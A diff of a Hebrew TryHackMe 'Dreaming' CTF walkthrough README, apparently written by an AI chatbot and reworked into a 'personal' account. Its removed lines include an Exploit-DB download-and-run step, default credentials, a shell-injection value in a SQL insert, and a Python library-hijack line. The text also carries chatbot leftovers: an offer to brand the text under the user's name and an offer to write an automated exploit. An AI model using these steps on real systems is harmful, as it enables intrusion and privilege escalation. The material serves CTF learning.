@@ -1,151 +1,78 @@
-הנה המדריך (Writeup) בפורמט **Markdown** מקצועי, מותאם להעלאה ישירה ל-GitHub (קובץ `README.md`). הוא מעוצב בצורה סרוקה עם קטעי קוד, טבלאות והיררכיה ברורה.
+
+
+# 💤 Dreaming - TryHackMe Writeup (Personal Walkthrough)
+
+## 📑 מבוא
+בתיעוד זה אני מפרט את תהליך הפריצה האישי שלי למכונת Dreaming. המטרה שלי הייתה לעבור דרך כל שכבות ההגנה, מהאינטרנט ועד להרשאות מנהל מערכת (Root), תוך ניצול שגיאות קונפיגורציה וקוד פגום.
 
 ---
 
-# 💤 Dreaming - TryHackMe Writeup
-**Machine URL:** [Dreaming on TryHackMe](https://tryhackme.com/room/dreaming)  
-**Difficulty:** Medium  
-**Focus:** CMS Exploitation, Command Injection, Python Library Hijacking
+## 1. איסוף מידע (Enumeration)
+
+### סריקת פורטים עם Nmap
+**הפקודה שביצעתי:** `nmap -sS -v <MACHINE_IP>`
+* **הסיבה:** רציתי להבין אילו "דלתות" פתוחות במכונה לפני שאני מתחיל לתקוף. זו נקודת המוצא של כל פרויקט.
+* **המטרה:** לזהות שירותים חשופים. גיליתי שרת Web (פורט 80) ושרת SSH (פורט 22).
+
+### סריקת ספריות עם Gobuster
+**הפקודה שביצעתי:** `gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/big.txt`
+* **הסיבה:** דף הבית של Apache היה דף ברירת מחדל ריק. הנחתי שיש אפליקציה מותקנת בנתיב פנימי שלא פורסם.
+* **המטרה:** למצוא נקודת כניסה (Entry Point) לאתר. מצאתי את הספרייה `/app`.
 
 ---
 
-## 📑 Table of Contents
-1. [Enumeration](#1-enumeration)
-2. [Initial Access (Lucien Flag)](#2-initial-access-lucien-flag)
-3. [Privilege Escalation (Death Flag)](#3-privilege-escalation-death-flag)
-4. [Horizontal Escalation (Morpheus Flag)](#4-horizontal-escalation-morpheus-flag)
+## 2. חדירה ראשונית (Initial Access)
+
+### פריצה ל-Pluck CMS
+**הפעולה:** ניחשתי את סיסמת ברירת המחדל `password` והרצתי אקספלויט RCE.
+* **הסיבה:** זיהיתי שהאתר מריץ **Pluck 4.7.13**. ידעתי שזו גרסה ישנה, ולכן חיפשתי עליה מידע ב-Exploit-DB.
+* **המטרה:** להשיג Shell (גישה למערכת) דרך פגיעות בהעלאת קבצים. הצלחתי לקבל גישה כמשתמש `www-data`.
+
+### מציאת פרטי המשתמש Lucien
+**הפעולה:** סרקתי את תיקיית `/opt` וקראתי את הקובץ `test.py`.
+* **הסיבה:** כמשתמש Web אין לי כמעט הרשאות. חיפשתי קבצים שנוצרו על ידי משתמשים אמיתיים במערכת, בתקווה למצוא סיסמאות שנשמרו בטעות.
+* **המטרה:** לבצע **Lateral Movement** (מעבר למשתמש חזק יותר). מצאתי את הסיסמה של **Lucien** והתחברתי ב-SSH.
+* **התוצאה:** השגתי את הדגל הראשון.
 
 ---
 
-## 1. Enumeration
+## 3. העלאת הרשאות (Privilege Escalation) - Death
 
-### Phase 1: Port Scanning
-נפתח בסריקת Nmap בסיסית כדי לזהות שירותים רצים.
+### בדיקת הרשאות Sudo
+**הפקודה שביצעתי:** `sudo -l`
+* **הסיבה:** רציתי לראות אם המנהל הגדיר בטעות פקודות ש-Lucien יכול להריץ עם הרשאות של משתמש אחר.
+* **המטרה:** למצוא מסלול העלאת הרשאות (Privilege Escalation Path).
+* **מה גיליתי:** שאני יכול להריץ סקריפט בשם `getDreams.py` כמשתמש **death**.
 
-**Command:**
-```bash
-nmap -sS -v <MACHINE_IP>
-```
-
-**Findings:**
-| Port | Service | Description |
-| :--- | :--- | :--- |
-| 22 | SSH | Open (OpenSSH 8.2p1) |
-| 80 | HTTP | Open (Apache Default Page) |
-
-### Phase 2: Directory Fuzzing
-מכיוון שדף הבית הוא ברירת המחדל של Apache, נחפש ספריות חבויות.
-
-**Command:**
-```bash
-gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/big.txt
-```
-
-**Findings:**
-* **Path found:** `/app`
-* **CMS identified:** Pluck 4.7.13 נמצא בתוך `/app/pluck-4.7.13`.
+### הזרקת פקודות (Command Injection)
+**הפעולה:** הזרקתי קוד Shell לתוך טבלת ה-MySQL של המערכת.
+* **הסיבה:** קראתי את קוד הפייתון של הסקריפט וזיהיתי שהוא משרשר נתונים מה-Database ישירות לתוך פקודת `echo`. הבנתי שאם אני אשלוט בנתונים ב-DB, אני אשלוט במה שהשרת מריץ.
+* **המטרה:** לנצל את חוסר הסינון (Sanitization) כדי להריץ פקודות כמשתמש **death**.
+* **התוצאה:** הרצתי פקודה שקראה עבורי את הדגל של death.
 
 ---
 
-## 2. Initial Access (Lucien Flag)
+## 4. השתלטות מלאה - Morpheus (Root Level)
 
-### Step 1: Pluck CMS Exploitation
-מערכת Pluck בגרסה זו פגיעה להעלאת קבצים (RCE). ראשית, נתחבר לממשק הניהול.
+### זיהוי חולשה בספריית פייתון (Python Library Hijacking)
+**הפעולה:** בדקתי הרשאות על קבצי המערכת ומצאתי שקובץ ה-`shutil.py` ניתן לכתיבה.
+* **הסיבה:** חיפשתי דרך להשפיע על סקריפטים שרצים על ידי משתמשים חזקים יותר (Morpheus). ידעתי שיש סקריפט גיבוי שמשתמש בספריית `shutil`.
+* **המטרה:** להזריק קוד זדוני ישירות לתוך "איברים" של מערכת ההפעלה.
 
-* **Login URL:** `http://<MACHINE_IP>/app/pluck-4.7.13/login.php`
-* **Default Credentials:** `admin:password`
-
-### Step 2: Exploitation
-נשתמש באקספלויט (CVE-2020-29607) כדי להעלות Webshell.
-
-**Command:**
-```bash
-wget https://www.exploit-db.com/download/49909 -O exploit.py
-python3 ./exploit.py <MACHINE_IP> 80 password /app/pluck-4.7.13
-```
-
-**Findings:**
-לאחר קבלת ה-Webshell, סרקתי את הקבצים במכונה ומצאתי בתיקיית `/opt` את הקובץ `test.py`.
-> **Credential Found:** Lucien : `[REDACTED_PASSWORD]`
-
-**Action:**
-התחברות באמצעות SSH: `ssh lucien@<MACHINE_IP>`.
-**Flag 1:** `/home/lucien/user.txt`
+### שינוי הרשאות והשגת הדגל האחרון
+**הפעולה:** ערכתי את `shutil.py` והוספתי שורה שמשנה את ההרשאות של הדגל של Morpheus ל-`777`.
+* **הסיבה:** בחרתי בדרך הזו כי היא שקטה ובטוחה. במקום לנסות לפרוץ ל-Morpheus, גרמתי למערכת עצמה לתת לי גישה לקובץ שלו.
+* **המטרה:** לנצל משימה מתוזמנת (Cron Job) שרצה בהרשאות גבוהות.
+* **התוצאה:** הדגל הפך לקריא לכולם, וסיימתי את החדר.
 
 ---
 
-## 3. Privilege Escalation (Death Flag)
-
-### Step 1: Identifying the Vulnerability
-נבדוק את הרשאות ה-Sudo של המשתמש.
-
-**Command:**
-```bash
-sudo -l
-```
-
-**Findings:**
-Lucien רשאי להריץ את הסקריפט `/opt/scripts/getDreams.py` כמשתמש **death** ללא סיסמה.
-
-### Step 2: MySQL Injection
-בדיקה של קוד המקור של `getDreams.py` חשפה שהוא מריץ פקודות מערכת (`echo`) המבוססות על נתונים מה-DB ללא סינון:
-`command = f"echo {dreamer} + {dream}"`
-
-**Command (Injection via MySQL):**
-מצאתי את סיסמת ה-MySQL ב-`.bash_history`. התחברתי והזרקתי פקודה שתקרא את הדגל:
-```sql
-mysql -u lucien -p[PASSWORD]
-USE library;
-INSERT INTO dreams (dreamer, dream) VALUES ("'flag'", "'; cat /home/death/death_flag.txt; # ");
-```
-
-**Action:**
-הריצו את הסקריפט שוב: `sudo -u death python3 /opt/scripts/getDreams.py`.
-**Flag 2:** מופיע בפלט של פקודת ה-Echo המוזרקת.
+## 🏁 סיכום אישי
+החדר הזה היה שיעור מצוין עבורי בכמה נושאים:
+1.  **ערנות:** תמיד לבדוק קבצי הגדרה וסיסמאות שנשכחו ב-`/opt`.
+2.  **תכנות מאובטח:** הבנתי כמה מסוכן להשתמש ב-`subprocess` או `os.system` בלי לסנן קלט.
+3.  **ניהול הרשאות:** ראיתי איך הרשאת כתיבה פשוטה על קובץ ספריה (`.py`) יכולה להפיל שרת שלם.
 
 ---
 
-## 4. Horizontal Escalation (Morpheus Flag)
-
-### Step 1: Finding Weak Permissions
-כמשתמש **death**, נחפש קבצים השייכים לקבוצת **morpheus**.
-
-**Command:**
-```bash
-find / -type f -group morpheus 2> /dev/null
-```
-
-**Findings:**
-הקובץ `/home/death/restore.py` מבצע גיבוי ומשתמש בספריית `shutil` של Python.
-בנוסף, גיליתי שקובץ הספרייה `/usr/lib/python3.8/shutil.py` ניתן לכתיבה (Writable) על ידי הקבוצה שלי.
-
-### Step 2: Python Library Hijacking
-נערוך את קובץ הספרייה הרשמי של המערכת כדי להריץ קוד זדוני כאשר סקריפט הגיבוי ירוץ (כנראה על ידי Cron Job של Morpheus).
-
-**Action:**
-הוספתי את השורה הבאה לפונקציה `copy2` בתוך `shutil.py`:
-```python
-import os
-os.system("chmod 777 /home/morpheus/morpheus_flag.txt")
-```
-
-**Final Flag:**
-המתנתי דקה שה-Cron Job ירוץ, ולאחר מכן הדגל הפך לקריא לכולם:
-```bash
-cat /home/morpheus/morpheus_flag.txt
-```
-
----
-
-## 🛡️ Conclusion
-החדר מדגים שרשרת תקיפה קלאסית:
-1.  זיהוי גרסת CMS פגיעה.
-2.  ניצול Command Injection בתוך סקריפטים פנימיים.
-3.  Library Hijacking ב-Python עקב הרשאות קבצים לא תקינות במערכת ההפעלה.
-
----
-**נכתב על ידי Gemini** (או השם שלך למיתוג ב-GitHub).
-
----
-
-**האם תרצה שאצור לך קובץ `scripts` לדוגמה שתוכל להעלות לאותו Repo ב-GitHub כדי להשלים את ה-Writeup?**
+**מה השלב הבא שתרצה שאעשה?** אולי תרצה שאצור לך קובץ `Exploit.py` אוטומטי שמבצע את כל השלבים האלו בלחיצת כפתור אחת?
